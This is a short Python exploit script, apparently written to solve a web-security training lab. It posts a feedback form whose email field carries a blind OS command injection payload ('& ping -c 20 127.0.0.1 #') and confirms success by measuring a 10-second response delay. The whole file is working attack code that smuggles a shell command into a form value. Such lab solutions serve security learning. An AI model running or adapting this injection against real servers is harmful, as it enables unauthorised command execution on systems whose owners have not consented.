import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import random
import string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf(url:str, session:requests.Session):
    try:
        r = session.get(url, verify=False, proxies=proxies, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {'name': 'csrf'})['value']
        return csrf
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return None

def exlpoit(url:str, s:requests.Session, csrf:str):
    data = {
        'csrf': csrf,
        'name': 'test',
        'email': '& ping -c 20 127.0.0.1 #',
        'subject': 'test',
        'message': 'test' 
        }
    try:
        r = s.post(url + '/feedback/submit', data, proxies=proxies, verify=False)
        if r.status_code == 200 and r.elapsed.total_seconds() >= 10:
            print("Delay was successful!")
            return True
        else:
            print("Delay was not successful")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)

    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    s = requests.Session()
    csrf = get_csrf(url + '/feedback', s)

    if exlpoit(url, s, csrf):
        print("Lab Solved!")
        sys.exit(0)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()